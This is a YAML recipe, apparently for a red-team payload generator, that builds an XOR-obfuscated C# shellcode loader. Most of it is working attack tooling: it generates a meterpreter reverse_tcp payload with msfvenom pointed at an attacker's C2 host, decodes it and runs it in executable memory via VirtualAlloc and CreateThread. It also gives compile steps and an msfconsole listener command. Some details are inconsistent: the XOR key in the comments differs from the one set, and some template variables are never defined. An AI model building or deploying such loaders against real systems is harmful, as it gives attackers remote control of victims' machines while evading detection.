versions:
  - version: 1
    comment: "Initial version"
    timestamp: "2026-02-17T00:00:00"
    original:
      meta:
        name: "Shellcode Injection with Options"
        category: "Process Injection"
        description: |
          Example recipe demonstrating preprocessing options.
          Choose between different shellcode generation methods (msfvenom, donut, or custom).
        effectiveness: "medium"
        mitre:
          tactic: "TA0002 - Execution"
          technique: "T1055 - Process Injection"
        artifacts:
          - "Spawned process with injected code"
          - "Network connection to C2 (if using reverse shell)"

      parameters:
        - name: "lhost"
          type: "ip"
          description: "Attacker/C2 server IP address for reverse connection"
          required_for: "Msfvenom shellcode"
          required: true

        - name: "lport"
          type: "port"
          description: "Port for reverse connection"
          required_for: "Msfvenom shellcode"
          required: true
          default: 443

        - name: "executable_path"
          type: "file"
          description: "Path to the executable to convert with donut"
          required_for: "Donut shellcode"
          required: true

        - name: "shellcode_hex"
          type: "hex"
          description: "Custom shellcode in hexadecimal format (without 0x prefix)"
          required_for: "Custom shellcode"
          required: true

        - name: "process_name"
          type: "string"
          description: "Target process name for injection"
          required: true
          default: "notepad.exe"

      preprocessing:
        - type: "option"
          name: "Select shellcode generation method"
          options:
            - type: "command"
              name: "Msfvenom shellcode"
              command: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{ lhost }} LPORT={{ lport }} EXITFUNC=thread -f raw"
              output_var: "raw_shellcode"

            - type: "command"
              name: "Donut shellcode"
              command: "donut -f {{ executable_path }} -a 2"
              output_var: "raw_shellcode"

            - type: "script"
              name: "Custom shellcode"
              script: "hex_to_bytes.py"
              args:
                hex_string: "{{ shellcode_hex }}"
              output_var: "raw_shellcode"

        - type: "script"
          name: "xor_encrypt"
          script: "xor_encrypt.py"
          args:
            data: "{{ raw_shellcode }}"
            key: "0xAA"
          output_var: "encrypted_shellcode"

      output:
        type: "template"
        template_ext: ".cs"
        template: |
          using System;
          using System.Runtime.InteropServices;

          namespace XorInjector
          {
              public class Program
              {
                  // P/Invoke declarations
                  [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
                  static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

                  [DllImport("kernel32.dll")]
                  static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

                  [DllImport("kernel32.dll")]
                  static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

                  const uint MEM_COMMIT = 0x00001000;
                  const uint PAGE_EXECUTE_READWRITE = 0x40;

                  public static void Main(string[] args)
                  {
                      // XOR-encoded shellcode (key: 0xfa)
                      {{ csharp_payload | indent(12) }}

                      Console.WriteLine($"[*] Encoded payload size: {buf.Length} bytes");

                      // Decode the XOR payload (key: 0xfa)
                      for (int i = 0; i < buf.Length; i++)
                      {
                          buf[i] = (byte)((uint)buf[i] ^ 0x{{ xor_key }});
                      }

                      Console.WriteLine("[+] Payload decoded successfully");

                      // Allocate RWX memory
                      IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                      if (addr == IntPtr.Zero)
                      {
                          Console.WriteLine("[-] Failed to allocate memory!");
                          return;
                      }
                      Console.WriteLine($"[+] Allocated memory at: 0x{addr.ToInt64():X}");

                      // Copy shellcode to allocated memory
                      Marshal.Copy(buf, 0, addr, buf.Length);
                      Console.WriteLine("[+] Shellcode copied to memory");

                      // Execute shellcode
                      IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
                      if (hThread == IntPtr.Zero)
                      {
                          Console.WriteLine("[-] Failed to create thread!");
                          return;
                      }

                      Console.WriteLine("[+] Shellcode thread created!");
                      Console.WriteLine("[+] Executing payload...");

                      // Wait for thread to complete
                      WaitForSingleObject(hThread, 0xFFFFFFFF);
                  }
              }
          }
        filename: "injector_{{ process_name | replace('.exe', '') }}.cs"
        compile:
          enabled: true
          language: "csharp"
          output_filename: "injector.exe"
          args: "/unsafe /optimize+"
        launch_instructions: |
          # Launch Instructions

          ## Run the injector

          ```powershell
          .\injector.exe
          ```

          ## If using msfvenom, start a listener:

          ```bash
          msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; run"
          ```
